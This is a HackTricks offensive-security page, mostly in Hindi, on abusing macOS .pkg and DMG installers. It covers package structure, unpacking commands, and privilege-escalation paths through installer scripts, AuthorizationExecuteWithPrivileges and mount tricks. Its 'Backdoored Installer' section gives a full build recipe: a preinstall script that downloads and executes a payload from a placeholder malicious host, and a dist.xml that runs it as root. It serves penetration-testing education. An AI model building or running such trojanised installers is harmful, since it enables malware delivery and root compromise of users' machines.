# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Pkg Basic Information

macOS **installer package** (जिसे `.pkg` फ़ाइल के रूप में भी जाना जाता है) एक फ़ाइल प्रारूप है जिसका उपयोग macOS **सॉफ़्टवेयर वितरित करने** के लिए करता है। ये फ़ाइलें एक **डिब्बे की तरह होती हैं जिसमें सॉफ़्टवेयर को सही ढंग से स्थापित और चलाने के लिए आवश्यक सभी चीजें होती हैं**।

पैकेज फ़ाइल स्वयं एक संग्रह है जो **फाइलों और निर्देशिकाओं की एक पदानुक्रम को रखता है जो लक्षित** कंप्यूटर पर स्थापित की जाएंगी। इसमें **स्क्रिप्ट** भी शामिल हो सकती हैं जो स्थापना से पहले और बाद में कार्य करने के लिए होती हैं, जैसे कि कॉन्फ़िगरेशन फ़ाइलों को सेट करना या सॉफ़्टवेयर के पुराने संस्करणों को साफ करना।

### Hierarchy

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: कस्टमाइज़ेशन (शीर्षक, स्वागत पाठ…) और स्क्रिप्ट/स्थापना जांच
- **PackageInfo (xml)**: जानकारी, स्थापना आवश्यकताएँ, स्थापना स्थान, चलाने के लिए स्क्रिप्ट के पथ
- **Bill of materials (bom)**: फ़ाइलों की सूची जिन्हें स्थापित, अपडेट या हटा दिया जाना है फ़ाइल अनुमतियों के साथ
- **Payload (CPIO archive gzip compresses)**: फ़ाइलें जो PackageInfo से `install-location` में स्थापित की जाएंगी
- **Scripts (CPIO archive gzip compressed)**: पूर्व और पश्चात स्थापना स्क्रिप्ट और अधिक संसाधन जिन्हें निष्पादन के लिए एक अस्थायी निर्देशिका में निकाला गया है।

### Decompress
```bash
# Tool to directly get the files inside a package
pkgutil —expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files ina. more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
इंस्टॉलर की सामग्री को मैन्युअल रूप से डीकंप्रेस किए बिना देखने के लिए, आप मुफ्त टूल [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/) का भी उपयोग कर सकते हैं।

## DMG बुनियादी जानकारी

DMG फ़ाइलें, या Apple Disk Images, एक फ़ाइल प्रारूप हैं जो Apple के macOS द्वारा डिस्क इमेज के लिए उपयोग किया जाता है। एक DMG फ़ाइल मूल रूप से एक **माउंट करने योग्य डिस्क इमेज** है (इसमें अपना खुद का फ़ाइल सिस्टम होता है) जिसमें कच्चा ब्लॉक डेटा होता है जो आमतौर पर संकुचित और कभी-कभी एन्क्रिप्टेड होता है। जब आप एक DMG फ़ाइल खोलते हैं, तो macOS इसे **एक भौतिक डिस्क की तरह माउंट करता है**, जिससे आप इसकी सामग्री तक पहुँच सकते हैं।

> [!CAUTION]
> ध्यान दें कि **`.dmg`** इंस्टॉलर **इतने सारे प्रारूपों** का समर्थन करते हैं कि अतीत में इनमें से कुछ में कमजोरियों का उपयोग **कर्नेल कोड निष्पादन** प्राप्त करने के लिए किया गया था।

### पदानुक्रम

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

एक DMG फ़ाइल का पदानुक्रम सामग्री के आधार पर भिन्न हो सकता है। हालाँकि, एप्लिकेशन DMGs के लिए, यह आमतौर पर इस संरचना का पालन करता है:

- शीर्ष स्तर: यह डिस्क इमेज की जड़ है। इसमें अक्सर एप्लिकेशन और संभवतः एप्लिकेशन फ़ोल्डर के लिए एक लिंक होता है।
- एप्लिकेशन (.app): यह वास्तविक एप्लिकेशन है। macOS में, एक एप्लिकेशन आमतौर पर एक पैकेज होता है जिसमें कई व्यक्तिगत फ़ाइलें और फ़ोल्डर होते हैं जो एप्लिकेशन बनाते हैं।
- एप्लिकेशन लिंक: यह macOS में एप्लिकेशन फ़ोल्डर के लिए एक शॉर्टकट है। इसका उद्देश्य आपको एप्लिकेशन स्थापित करने में आसानी प्रदान करना है। आप .app फ़ाइल को इस शॉर्टकट पर खींच सकते हैं ताकि ऐप स्थापित हो सके।

## pkg दुरुपयोग के माध्यम से प्रिवेस्क

### सार्वजनिक निर्देशिकाओं से निष्पादन

यदि एक पूर्व या पोस्ट इंस्टॉलेशन स्क्रिप्ट उदाहरण के लिए **`/var/tmp/Installerutil`** से निष्पादित हो रही है, और हमलावर उस स्क्रिप्ट को नियंत्रित कर सकता है, तो वह इसे निष्पादित करते समय विशेषाधिकार बढ़ा सकता है। या एक और समान उदाहरण:

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

यह एक [सार्वजनिक फ़ंक्शन](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) है जिसे कई इंस्टॉलर और अपडेटर **रूट के रूप में कुछ निष्पादित करने** के लिए कॉल करेंगे। यह फ़ंक्शन **निष्पादित करने के लिए फ़ाइल** के **पथ** को पैरामीटर के रूप में स्वीकार करता है, हालाँकि, यदि एक हमलावर इस फ़ाइल को **संशोधित** कर सकता है, तो वह **विशेषाधिकार बढ़ाने** के लिए रूट के साथ इसके निष्पादन का **दुरुपयोग** कर सकेगा।
```bash
# Breakpoint in the function to check wich file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this missconfig
```
For more info check this talk: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### Execution by mounting

यदि एक इंस्टॉलर `/tmp/fixedname/bla/bla` में लिखता है, तो आप **`/tmp/fixedname`** पर कोई मालिक नहीं के साथ **एक माउंट** बना सकते हैं ताकि आप इंस्टॉलेशन प्रक्रिया का दुरुपयोग करने के लिए **इंस्टॉलेशन के दौरान किसी भी फ़ाइल को संशोधित** कर सकें।

इसका एक उदाहरण **CVE-2021-26089** है जिसने **रूट के रूप में निष्पादन** प्राप्त करने के लिए **एक आवधिक स्क्रिप्ट को ओवरराइट** करने में सफलता पाई। अधिक जानकारी के लिए इस टॉक को देखें: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkg as malware

### Empty Payload

यह केवल **`.pkg`** फ़ाइल को **पूर्व और पश्चात-स्थापना स्क्रिप्ट** के साथ उत्पन्न करना संभव है, जिसमें स्क्रिप्ट के अंदर केवल मैलवेयर होता है।

### JS in Distribution xml

यह पैकेज के **वितरण xml** फ़ाइल में **`<script>`** टैग जोड़ना संभव है और वह कोड निष्पादित होगा और यह **`system.run`** का उपयोग करके **कमांड्स निष्पादित** कर सकता है:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

### Backdoored Installer

दुष्ट इंस्टॉलर जो dist.xml के अंदर एक स्क्रिप्ट और JS कोड का उपयोग करता है
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options customize="allow" require-scripts="false"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Buil final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## संदर्भ

- [**DEF CON 27 - पैकेजों को अनपैक करना: macOS इंस्टॉलर पैकेजों और सामान्य सुरक्षा दोषों के अंदर एक नज़र**](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [**OBTS v4.0: "macOS इंस्टॉलर की जंगली दुनिया" - टोनी लैम्बर्ट**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [**DEF CON 27 - पैकेजों को अनपैक करना: macOS इंस्टॉलर पैकेजों के अंदर एक नज़र**](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)

{{#include ../../../banners/hacktricks-training.md}}
